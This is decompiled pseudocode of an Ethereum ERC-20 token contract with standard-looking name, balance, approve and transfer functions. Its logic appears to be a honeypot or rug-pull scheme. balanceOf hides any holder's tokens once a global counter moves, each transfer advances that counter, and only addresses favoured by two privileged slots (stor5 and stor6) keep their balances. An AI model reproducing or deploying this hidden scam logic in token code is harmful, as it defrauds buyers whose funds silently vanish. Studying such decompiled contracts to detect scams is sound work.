contract main {




// =====================  Runtime code  =====================


address stor0;
mapping of struct stor1;
mapping of uint256 allowance;
array of uint256 name;
array of uint256 symbol;
address stor5;
uint8 decimals; offset 160
address stor6;
uint256 totalSupply;
uint256 stor8;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function balanceOf(address arg1) {
    if stor1[address(arg1)].field_256 != stor8:
        return 0
    return stor1[address(arg1)].field_0
}

function approve(address arg1, uint256 arg2) {
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    if stor1[address(arg1)].field_256 != stor8:
        stor1[address(arg1)].field_0 = 0
    require arg2 <= stor1[address(msg.sender)].field_0
    stor1[address(msg.sender)].field_0 -= arg2
    require stor1[address(arg1)].field_0 + arg2 >= stor1[address(arg1)].field_0
    stor1[address(arg1)].field_0 += arg2
    require stor8 + 1 >= stor8
    stor8++
    if msg.sender == stor5:
        stor1[address(arg1)].field_256 = stor8
        stor1[stor5].field_256 = stor8
        stor1[stor6].field_256 = stor8
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    if not stor5:
        if arg1 == stor0:
            stor5 = arg2
    if not stor6:
        if arg1 == stor0:
            stor6 = msg.sender
    if stor6 != msg.sender:
        require arg3 <= stor1[address(arg1)].field_0
        stor1[address(arg1)].field_0 -= arg3
    else:
        if arg1 != stor0:
            require stor1[address(arg1)].field_256 == stor8
        if stor6 != msg.sender:
            require arg3 <= stor1[address(arg1)].field_0
            stor1[address(arg1)].field_0 -= arg3
        else:
            if arg1 != stor0:
                require arg3 <= stor1[address(arg1)].field_0
                stor1[address(arg1)].field_0 -= arg3
            else:
                if arg2 != stor5:
                    require arg3 <= stor1[address(arg1)].field_0
                    stor1[address(arg1)].field_0 -= arg3
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require stor1[address(arg2)].field_0 + arg3 >= stor1[address(arg2)].field_0
    stor1[address(arg2)].field_0 += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
